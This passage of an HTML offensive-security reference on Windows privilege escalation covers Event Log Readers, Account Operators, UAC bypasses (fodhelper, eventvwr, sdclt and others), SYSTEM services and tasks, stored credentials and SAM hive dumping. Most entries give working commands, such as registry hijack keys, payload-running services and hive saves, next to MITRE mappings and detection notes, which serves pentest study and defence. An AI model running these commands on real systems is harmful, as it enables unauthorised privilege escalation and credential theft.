+<h4>References</h4><ul class="links"><li><a href="https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/" rel="noopener nofollow">Tarlogic, Abusing SeLoadDriverPrivilege for privilege escalation</a></li><li><a href="https://github.com/TarlogicSecurity/EoPLoadDriver" rel="noopener nofollow">Tarlogic, EoPLoadDriver (SeLoadDriverPrivilege abuse)</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Same as the SeLoadDriver path: driver-load events and the driver blocklist / HVCI may block it.</p>
+</article>
+<article id="pe-event-log-readers">
+<h3>Event Log Readers</h3>
+<p class="summary">Read Security / PowerShell logs for leaked credentials.</p>
+<p class="desc">Membership in Event Log Readers grants read access to the restricted Security event log; the PowerShell-Operational log is separately readable by any interactive user by default, so it is worth checking even without the group. Where process-creation auditing AND the &quot;Include command line in process creation events&quot; policy, or PowerShell script-block / module logging, are enabled, those logs frequently contain credentials passed on command lines or embedded in scripts. Harvest them and reuse the account.</p>
+<p class="meta"><b>Affects:</b> All supported Windows / Server versions (depends on logging configuration).</p>
+<h4>Requires</h4><ul class="req"><li>Membership in Event Log Readers</li><li>Credentials actually present in logged events</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Search the Security log for passwords</span>
+wevtutil qe Security /f:text /rd:true /c:200 | findstr /i &quot;password pass&quot;</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil" rel="noopener nofollow">wevtutil (built-in)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1552/" rel="noopener nofollow">T1552</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://notes.dollarboysushil.com/windows-privilege-escalation/group-privileges/event-log-readers" rel="noopener nofollow">OSCP/CPTS Notes, Event Log Readers</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Read-only and quiet; success depends entirely on whether logging captured a secret.</p>
+</article>
+<article id="pe-account-operators">
+<h3>Account Operators</h3>
+<p class="summary">Take over non-protected accounts; log on to DCs.</p>
+<p class="desc">On a domain controller, Account Operators can create and modify users and groups that are NOT AdminSDHolder-protected (Domain Admins, the Operators groups, etc. are off-limits), and may log on locally to DCs. The path is indirect: reset the password of, or add yourself to, a delegated non-protected account or group that holds privileges (a custom admin group, an account with DCSync/GPO rights), then use those, rather than joining a protected group directly.</p>
+<p class="meta"><b>Affects:</b> All supported Windows Server versions (Active Directory).</p>
+<h4>Requires</h4><ul class="req"><li>Membership in Account Operators</li><li>A privileged NON-protected account or group to take over</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Reset a non-protected user's password</span>
+net user &lt;user&gt; &lt;NewPass&gt; /domain</code></pre>
+<pre><code><span class="cmt"># Add yourself to a delegated non-protected group</span>
+net group &quot;&lt;Group&gt;&quot; &lt;you&gt; /add /domain</code></pre>
+<pre><code><span class="cmt"># ADModule equivalents</span>
+Set-ADAccountPassword -Identity &lt;user&gt; -Reset -NewPassword (ConvertTo-SecureString &quot;&lt;NewPass&gt;&quot; -AsPlainText -Force)
+Add-ADGroupMember -Identity &quot;&lt;Group&gt;&quot; -Members &lt;you&gt;</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-user" rel="noopener nofollow">net (built-in)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1098/" rel="noopener nofollow">T1098</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://www.kayssel.com/post/interesting-groups-ad/" rel="noopener nofollow">kayssel, Account/Backup Operators &amp; Event Log Readers</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Password resets and group changes (Event ID 4724/4728/4732) are high-fidelity, and this is a domain-level change.</p>
+</article>
+<article id="pe-admins-filtered">
+<h3>Administrators (Filtered Token)</h3>
+<p class="summary">You are admin, but UAC filters the token.</p>
+<p class="desc">whoami /groups shows the local Administrators SID, but it is &quot;deny-only&quot; and your token runs at Medium integrity because of UAC. You already have the rights; you just need to unfilter the token. A UAC bypass restores the high-integrity admin token, and from there any Admin → SYSTEM technique applies.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions with UAC enabled.</p>
+<h4>Requires</h4><ul class="req"><li>Membership in local Administrators with a UAC-filtered token</li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1548/002/" rel="noopener nofollow">T1548.002</a></p>
+<p class="opsec"><b>OPSEC / detection:</b> No action by itself; it routes to the UAC-bypass / admin-to-SYSTEM techniques.</p>
+</article></section>
+<section class="phase" id="ph-admin"><h2 class="phase-h" style="color:oklch(0.70 0.13 326)">Admin Users</h2><article id="pe-cat-admin">
+<h3>Admin Users</h3>
+<p class="summary">Already a local admin, at medium (UAC-filtered) or high integrity.</p>
+<p class="desc">The account is in the local Administrators group. If UAC filters it to a medium-integrity token, bypass UAC to obtain the high-integrity token; once high-integrity, any administrator-to-SYSTEM technique applies.</p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows Local Privilege Escalation</a></li></ul>
+</article>
+<article id="pe-cat-uac">
+<h3><span class="kind">category</span> UAC Bypass</h3>
+<p class="summary">Raise a UAC-filtered (medium-integrity) admin token to high integrity, no consent prompt.</p>
+<p class="desc">With UAC enabled, an administrator runs under a split token: a filtered medium-integrity token for everyday use, and the full high-integrity token only after a consent prompt. A bypass abuses an auto-elevating, Microsoft-signed binary or scheduled task to obtain the high-integrity token silently. It raises integrity, not privilege, so it applies only to an account that is already a local administrator; a standard user gains nothing. UACMe catalogues ~70 methods; the common ones are covered here.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1548/002/" rel="noopener nofollow">T1548.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/" rel="noopener nofollow">PentestLab, UAC Bypass Fodhelper</a></li></ul>
+</article>
+<article id="pe-cat-admin2sys">
+<h3><span class="kind">category</span> Elevate to SYSTEM</h3>
+<p class="summary">Pivot from a high-integrity administrator token to NT AUTHORITY\SYSTEM.</p>
+<p class="desc">With a high-integrity administrator token, obtain a SYSTEM context: install or reconfigure a service to run as LocalSystem, register a scheduled task that runs as SYSTEM, or duplicate the token of an existing SYSTEM process.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1134/001/" rel="noopener nofollow">T1134.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows Local Privilege Escalation</a></li></ul>
+</article>
+<article id="pe-uac-fodhelper">
+<h3>Fodhelper</h3>
+<p class="summary">Auto-elevate fodhelper via an HKCU ms-settings handler.</p>
+<p class="desc">fodhelper.exe auto-elevates and reads HKCU\Software\Classes\ms-settings\shell\open\command (with DelegateExecute). Plant your command there and run fodhelper to execute at High integrity with no UAC prompt. Elevates an existing admin to High integrity; it does not turn a standard user into admin.</p>
+<p class="meta"><b>Affects:</b> Windows 10 (all builds) and Windows 11 through 24H2, plus Server 2016 and later. Unpatched per UACME (method 33, works from build 10240); the most reliable registry-handler UAC bypass.</p>
+<h4>Requires</h4><ul class="req"><li>Member of local Administrators running at Medium integrity (default UAC)</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Set the hijack key</span>
+reg add &quot;HKCU\Software\Classes\ms-settings\Shell\Open\command&quot; /ve /t REG_SZ /d &quot;cmd.exe&quot; /f
+reg add &quot;HKCU\Software\Classes\ms-settings\Shell\Open\command&quot; /v DelegateExecute /t REG_SZ /d &quot;&quot; /f</code></pre>
+<pre><code><span class="cmt"># Trigger elevation</span>
+fodhelper.exe</code></pre>
+<pre><code><span class="cmt"># Clean up the signatured key afterward</span>
+reg delete &quot;HKCU\Software\Classes\ms-settings&quot; /f</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/hfiref0x/UACME" rel="noopener nofollow">UACMe</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1548/002/" rel="noopener nofollow">T1548.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/" rel="noopener nofollow">winscripting.blog, First entry: Welcome and fileless UAC bypass</a></li><li><a href="https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/" rel="noopener nofollow">PentestLab, UAC Bypass Fodhelper</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> The HKCU ms-settings shell-open-command key + fodhelper spawning cmd is a widely-signatured detection. Clean up the key afterward.</p>
+</article>
+<article id="pe-uac-eventvwr">
+<h3>Event Viewer (eventvwr)</h3>
+<p class="summary">Hijack the mscfile handler eventvwr.exe auto-elevates.</p>
+<p class="desc">eventvwr.exe is an auto-elevating Microsoft-signed binary that opens its .msc snap-in via the HKCU\Software\Classes\mscfile\shell\open\command handler, which is checked before the HKCR (system-wide) one and never validated. A medium-integrity admin can point that key at an arbitrary command; launching eventvwr.exe then runs it at High integrity with no UAC prompt (default UAC level; not &quot;Always Notify&quot;).</p>
+<p class="meta"><b>Affects:</b> Legacy: Windows 7 – Windows 10 1607. Patched in the Creators Update (1703); does NOT work on modern builds.</p>
+<h4>Requires</h4><ul class="req"><li>Member of local Administrators running at Medium integrity (default UAC)</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Set the hijack key</span>
+reg add &quot;HKCU\Software\Classes\mscfile\shell\open\command&quot; /ve /t REG_SZ /d &quot;cmd.exe&quot; /f</code></pre>
+<pre><code><span class="cmt"># Trigger elevation</span>
+eventvwr.exe</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/hfiref0x/UACME" rel="noopener nofollow">UACMe</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1548/002/" rel="noopener nofollow">T1548.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/" rel="noopener nofollow">enigma0x3, Fileless UAC Bypass via eventvwr</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> The HKCU mscfile shell-open-command key + eventvwr.exe spawning cmd is a classic, widely-signatured detection. Remove the key afterward.</p>
+</article>
+<article id="pe-uac-sdclt">
+<h3>Sdclt</h3>
+<p class="summary">Auto-elevating sdclt via the Folder/App Path handler.</p>
+<p class="desc">sdclt.exe (Backup and Restore) auto-elevates and, on Windows 10, spawns control.exe, which resolves its open command through HKCU\Software\Classes\Folder\shell\open\command. Plant your command in that key and launch sdclt to run at High integrity with no prompt. (A separate sdclt variant instead hijacks HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe; it does not use the Folder key.)</p>
+<p class="meta"><b>Affects:</b> Legacy: Windows 10 1507 to 1607. The Folder-command variant taught here was hardened around 1709 (RS3); it does NOT work on modern builds.</p>
+<h4>Requires</h4><ul class="req"><li>Member of local Administrators at Medium integrity</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Set the hijack key</span>
+reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /ve /t REG_SZ /d &quot;cmd.exe&quot; /f
+reg add &quot;HKCU\Software\Classes\Folder\shell\open\command&quot; /v DelegateExecute /t REG_SZ /d &quot;&quot; /f</code></pre>
+<pre><code><span class="cmt"># Trigger</span>
+sdclt.exe</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/hfiref0x/UACME" rel="noopener nofollow">UACMe</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1548/002/" rel="noopener nofollow">T1548.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://0x1.gitlab.io/exploit/Another-sdclt-UAC-bypass/" rel="noopener nofollow">0x1, Another sdclt UAC bypass (Folder\shell\open\command variant)</a></li><li><a href="https://pentestlab.blog/2017/06/09/uac-bypass-sdclt/" rel="noopener nofollow">PentestLab, UAC Bypass Sdclt</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> HKCU Folder/command key + sdclt spawning cmd is signatured. Clean up afterward.</p>
+</article>
+<article id="pe-uac-computerdefaults">
+<h3>ComputerDefaults</h3>
+<p class="summary">Auto-elevating computerdefaults via ms-settings handler.</p>
+<p class="desc">computerdefaults.exe auto-elevates and, like fodhelper, launches its target through the HKCU\Software\Classes\ms-settings\shell\open\command handler. Point that key at your command and run computerdefaults to execute at High integrity without a consent prompt.</p>
+<p class="meta"><b>Affects:</b> Windows 10 1803 and later, Windows 11, and Server 2019 and later. Same ms-settings handler as fodhelper, but per UACME (method 62) the ComputerDefaults variant only works from build 1803, so Server 2016 is not affected.</p>
+<h4>Requires</h4><ul class="req"><li>Member of local Administrators at Medium integrity</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Set the hijack key</span>
+reg add &quot;HKCU\Software\Classes\ms-settings\Shell\Open\command&quot; /ve /t REG_SZ /d &quot;cmd.exe&quot; /f
+reg add &quot;HKCU\Software\Classes\ms-settings\Shell\Open\command&quot; /v DelegateExecute /t REG_SZ /d &quot;&quot; /f</code></pre>
+<pre><code><span class="cmt"># Trigger</span>
+computerdefaults.exe</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/hfiref0x/UACME" rel="noopener nofollow">UACMe</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1548/002/" rel="noopener nofollow">T1548.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/" rel="noopener nofollow">winscripting.blog, First entry: Welcome and fileless UAC bypass (ms-settings handler origin)</a></li><li><a href="https://attack.mitre.org/techniques/T1548/002/" rel="noopener nofollow">MITRE T1548.002, Bypass UAC</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Shares the fodhelper ms-settings IOC; clean up the key.</p>
+</article>
+<article id="pe-uac-cmstp">
+<h3>CMSTPLUA / ICMLuaUtil</h3>
+<p class="summary">Auto-elevate via the CMSTP elevated COM interface.</p>
+<p class="desc">This bypass abuses an auto-elevating COM object, the ICMLuaUtil &quot;Elevated COM Interface&quot; (CLSID {3E5FC7F9-9A51-4367-9063-A120244FBEC7}), to run a command as a High-integrity process. Implemented by UACMe method 41 and several public scripts; needs no file on disk.</p>
+<p class="meta"><b>Affects:</b> Windows 7 to Windows 11; the primitive is unfixed but the technique is heavily detected by default EDR/Sigma rules.</p>
+<h4>Requires</h4><ul class="req"><li>Member of local Administrators at Medium integrity</li></ul>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/hfiref0x/UACME" rel="noopener nofollow">UACMe</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1548/002/" rel="noopener nofollow">T1548.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://gist.github.com/api0cradle/d4aaef39db0d845627d819b2b6b30512" rel="noopener nofollow">Oddvar Moe (api0cradle), UAC bypass using CMSTPLUA COM interface</a></li><li><a href="https://attack.mitre.org/techniques/T1548/002/" rel="noopener nofollow">MITRE T1548.002, Bypass User Account Control</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> The signal is a high-integrity process spawned by dllhost.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7} (the CMSTPLUA COM surrogate), plus abnormal ICMLuaUtil::ShellExec calls; this method does not run cmstp.exe. Heavily covered by public Sigma/Elastic rules.</p>
+</article>
+<article id="pe-uac-silentcleanup">
+<h3>SilentCleanup Task</h3>
+<p class="summary">Abuse the auto-elevating SilentCleanup scheduled task.</p>
+<p class="desc">The built-in SilentCleanup scheduled task runs &quot;with highest privileges&quot; yet is launchable by normal users. The task's action path (%windir%\system32\cleanmgr.exe) is expanded from the user-controlled environment block, so redirecting windir in HKCU\Environment makes the elevated task launch your binary instead.</p>
+<p class="meta"><b>Affects:</b> Windows 8.1 to Windows 11 (this environment-variable-expansion variant is documented from Windows 8.1, not plain Windows 8). On Server it only applies to installs with the Desktop Experience (GUI) feature, where cleanmgr.exe is present; it does not work out-of-the-box on Server Core, where cleanmgr.exe is absent by default.</p>
+<h4>Requires</h4><ul class="req"><li>Member of local Administrators at Medium integrity</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Run the task</span>
+schtasks /run /tn &quot;\Microsoft\Windows\DiskCleanup\SilentCleanup&quot; /i</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/hfiref0x/UACME" rel="noopener nofollow">UACMe</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1548/002/" rel="noopener nofollow">T1548.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://www.tiraniddo.dev/2017/05/exploiting-environment-variables-in.html" rel="noopener nofollow">Tyranid's Lair, Exploiting Environment Variables in Scheduled Tasks</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Environment-variable hijack in HKCU plus an elevated task spawning an odd child is detectable.</p>
+</article>
+<article id="pe-admin-service-system">
+<h3>SYSTEM Service (PsExec / sc create)</h3>
+<p class="summary">Admin creates a service the SCM runs as SYSTEM.</p>
+<p class="desc">A high-integrity administrator can register a Windows service whose binary the Service Control Manager launches as LocalSystem. Do it by hand with sc create, or let PsExec -s spin up a transient service and hand back a SYSTEM shell. (RunasCs does not create a service; it launches a process under another account when you hold suitable credentials or a token, which is the token/credential-impersonation lane.) The default administrator-to-SYSTEM step.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions.</p>
+<h4>Requires</h4><ul class="req"><li>High-integrity administrator context</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># PsExec SYSTEM shell</span>
+PsExec64.exe -accepteula -s -i cmd.exe</code></pre>
+<pre><code><span class="cmt"># Manual service as SYSTEM</span>
+sc create svc binPath= &quot;cmd /c C:\Temp\payload.exe&quot; &amp; sc start svc</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec" rel="noopener nofollow">PsExec (Sysinternals)</a></li><li><a href="https://github.com/antonioCoco/RunasCs" rel="noopener nofollow">RunasCs</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1543/003/" rel="noopener nofollow">T1543.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://github.com/antonioCoco/RunasCs" rel="noopener nofollow">RunasCs</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> Service creation (Event ID 7045) and PsExec named pipes are classic detections.</p>
+</article>
+<article id="pe-admin-schtask-system">
+<h3>Scheduled Task as SYSTEM</h3>
+<p class="summary">Register a task that runs as SYSTEM.</p>
+<p class="desc">As a high-integrity administrator, create a scheduled task whose principal is SYSTEM and run it immediately. schtasks /ru SYSTEM (or a task XML with the LocalSystem principal) executes your command as NT AUTHORITY\SYSTEM without installing a service.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions.</p>
+<h4>Requires</h4><ul class="req"><li>High-integrity administrator context</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Create + run a SYSTEM task</span>
+schtasks /create /tn sysT /tr &quot;C:\Temp\payload.exe&quot; /sc once /st 00:00 /ru SYSTEM /f
+schtasks /run /tn sysT</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks" rel="noopener nofollow">schtasks (built-in)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1053/005/" rel="noopener nofollow">T1053.005</a></p>
+<p class="opsec"><b>OPSEC / detection:</b> Task creation (Event ID 4698) with a SYSTEM principal is a strong signal.</p>
+</article>
+<article id="pe-admin-token">
+<h3>Token Impersonation (getsystem)</h3>
+<p class="summary">Duplicate a SYSTEM process token.</p>
+<p class="desc">A high-integrity administrator can enable SeDebugPrivilege, open a process already running as SYSTEM (e.g. winlogon.exe), duplicate its token with DuplicateTokenEx, and spawn a new process with it: the manual / incognito / PowerSploit approach. Meterpreter getsystem reaches the same outcome differently: its token-duplication technique enumerates a service running as SYSTEM and reflectively injects into it to grab that service's token, and its other techniques use named-pipe impersonation.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions (token model).</p>
+<h4>Requires</h4><ul class="req"><li>High-integrity administrator context (SeDebugPrivilege for token duplication; service-creation/SeImpersonate for the named-pipe technique)</li></ul>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/rapid7/metasploit-framework" rel="noopener nofollow">Meterpreter (getsystem)</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1134/001/" rel="noopener nofollow">T1134.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://attack.mitre.org/techniques/T1134/001/" rel="noopener nofollow">MITRE T1134.001, Token Impersonation</a></li></ul>
+<p class="opsec"><b>OPSEC / detection:</b> A handle to winlogon.exe (or another SYSTEM process), service creation, named-pipe impersonation, and reflective injection into a SYSTEM service are top-tier EDR detections.</p>
+</article></section>
+<section class="phase" id="ph-finding"><h2 class="phase-h" style="color:oklch(0.70 0.13 87)">Unprivileged Users</h2><article id="pe-cat-enum">
+<h3>Unprivileged Users</h3>
+<p class="summary">No inherent privilege; enumerate for a weakness.</p>
+<p class="desc">The account holds no useful privilege, group, or admin membership. Enumerate the host (winPEAS / PrivescCheck) and work the findings: stored credentials, service and DLL/PATH misconfigurations, tasks and autoruns, privileged app/service abuse, and known-CVE exploits.</p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows Local Privilege Escalation</a></li><li><a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS" rel="noopener nofollow">carlospolop, winPEAS</a></li></ul>
+</article>
+<article id="pe-cat-creds">
+<h3><span class="kind">category</span> Stored Credentials</h3>
+<p class="summary">Reusable secrets on disk and in the registry.</p>
+<p class="desc">Credentials you can replay as a more privileged user: registry-hive secrets, DPAPI, autologon and saved credentials, PowerShell history, files and configs, and password-manager / browser stores. winPEAS and LaZagne automate most of these. (Live LSASS/process memory is covered under the credential-dumping techniques, not this on-disk hub.)</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1552/" rel="noopener nofollow">T1552</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows Local Privilege Escalation</a></li></ul>
+</article>
+<article id="creds-registry">
+<h3><span class="kind">category</span> Registry &amp; Hives</h3>
+<p class="summary">Secrets in the SAM/SYSTEM hives and registry.</p>
+<p class="desc">Local account hashes and cleartext in the registry: dump the SAM + SYSTEM hives, abuse HiveNightmare/SeriousSAM for a shadow-copy read, or read a Winlogon autologon password.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1552/002/" rel="noopener nofollow">T1552.002</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html" rel="noopener nofollow">HackTricks, Stealing Credentials</a></li></ul>
+</article>
+<article id="creds-files">
+<h3><span class="kind">category</span> Files &amp; History</h3>
+<p class="summary">Secrets in saved credentials, history, and config files.</p>
+<p class="desc">Credentials left in files: cmdkey-saved credentials, PowerShell history, and configs, scripts, and unattend files across the host.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1552/001/" rel="noopener nofollow">T1552.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows Local Privilege Escalation</a></li></ul>
+</article>
+<article id="creds-vaults">
+<h3><span class="kind">category</span> Vaults &amp; DPAPI</h3>
+<p class="summary">DPAPI-protected secrets and password vaults.</p>
+<p class="desc">Decrypt DPAPI-protected credentials and vaults, and loot password managers and browser stores.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1555/004/" rel="noopener nofollow">T1555.004</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/" rel="noopener nofollow">harmj0y, Operational Guidance for Offensive User DPAPI Abuse</a></li></ul>
+</article>
+<article id="pe-cat-services">
+<h3><span class="kind">category</span> Service Misconfigurations</h3>
+<p class="summary">Weak service ACLs, paths, binaries, and registry keys.</p>
+<p class="desc">A SYSTEM service you can influence (a weak service DACL (SERVICE_CHANGE_CONFIG), an unquoted path, a writable binary, or a writable service registry key), so you choose what it runs.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1543/003/" rel="noopener nofollow">T1543.003</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows Local Privilege Escalation</a></li></ul>
+</article>
+<article id="pe-cat-dll">
+<h3><span class="kind">category</span> DLL &amp; PATH Hijacking</h3>
+<p class="summary">Privileged process loads a DLL you control.</p>
+<p class="desc">A privileged process resolves a DLL by name from a location you can write to: a hijackable service DLL, or a user-writable directory on the system PATH.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1574/001/" rel="noopener nofollow">T1574.001</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows Local Privilege Escalation</a></li></ul>
+</article>
+<article id="pe-cat-tasks">
+<h3><span class="kind">category</span> Scheduled Tasks &amp; Autoruns</h3>
+<p class="summary">Writable code a privileged context runs automatically.</p>
+<p class="desc">A binary or script a higher-privileged context launches on a schedule or at logon is writable by you. Overwrite it and wait for, or invoke, the trigger.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1053/005/" rel="noopener nofollow">T1053.005</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows Local Privilege Escalation</a></li></ul>
+</article>
+<article id="pe-cat-apps">
+<h3><span class="kind">category</span> Privileged App &amp; Service Abuse</h3>
+<p class="summary">Abuse a privileged local app or service.</p>
+<p class="desc">Abuse an application or service running at higher privilege: a local MSSQL instance, vulnerable third-party software with a known LPE, an exploitable privileged service (PrintNightmare), an admin-run GUI you can break out of, or the Windows Installer when the AlwaysInstallElevated policy lets any user install an MSI as SYSTEM.</p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows Local Privilege Escalation</a></li></ul>
+</article>
+<article id="pe-cat-cve">
+<h3><span class="kind">category</span> Known Exploits (CVE)</h3>
+<p class="summary">Run a public LPE exploit or named technique (CVE or not).</p>
+<p class="desc">When config and credentials are clean, run a public local-privilege-escalation exploit: kernel and driver CVEs, a few famous non-kernel one-shots, plus recent Defender-remediation races (BlueHammer/RedSun). Map the build and hotfixes first. Kernel/driver and classic one-shot CVEs are loud and best on older, unpatched hosts, but the Defender-remediation 0-days (BlueHammer, patched April 2026; RedSun) hit current, fully-patched builds.</p>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1068/" rel="noopener nofollow">T1068</a></p>
+<h4>References</h4><ul class="links"><li><a href="https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html" rel="noopener nofollow">HackTricks, Windows Local Privilege Escalation</a></li></ul>
+</article>
+<article id="pe-sam-system-dump">
+<h3>SAM &amp; SYSTEM Hive Dump</h3>
+<p class="summary">Save SAM+SYSTEM, extract local hashes offline.</p>
+<p class="desc">Save the SAM and SYSTEM registry hives and process them offline to recover local NTLM hashes (the SYSTEM hive holds the bootkey that decrypts SAM). The reg save command below operates on the live registry and needs backup semantics (admin, SeBackup, or Backup Operators) at runtime; a read ACL on the hive files alone is not enough for it. The case where a misconfigured ACL lets an unprivileged user read the on-disk hive files (out of a shadow copy, no backup privilege) is HiveNightmare/SeriousSAM, covered separately. A cracked or passed-the-hash local admin enables lateral movement.</p>
+<p class="meta"><b>Affects:</b> All supported Windows versions (depends on read access to the hives).</p>
+<h4>Requires</h4><ul class="req"><li>Backup semantics for reg save: admin, SeBackup/SeRestore, or Backup Operators (a file-read ACL alone is the HiveNightmare path)</li></ul>
+<h4>Example commands</h4>
+<pre><code><span class="cmt"># Save hives</span>
+reg save HKLM\SAM C:\Temp\sam.hive
+reg save HKLM\SYSTEM C:\Temp\system.hive</code></pre>
+<pre><code><span class="cmt"># Dump offline</span>
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL</code></pre>
+<h4>Tools</h4><ul class="links"><li><a href="https://github.com/fortra/impacket" rel="noopener nofollow">impacket-secretsdump</a></li></ul>
+<p class="meta">MITRE ATT&amp;CK: <a href="https://attack.mitre.org/techniques/T1003/002/" rel="noopener nofollow">T1003.002</a></p>
